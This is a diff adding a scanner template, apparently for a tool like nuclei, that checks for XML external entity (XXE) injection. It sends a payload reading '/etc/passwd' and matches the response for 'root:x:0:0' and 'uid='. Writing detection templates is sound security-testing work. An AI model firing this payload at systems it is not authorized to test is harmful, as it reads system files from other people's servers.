@@ -1,0 +1,23 @@
+id: xxe2-095
+name: 'XXE file read in content'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via content'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      content:
+        - '<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
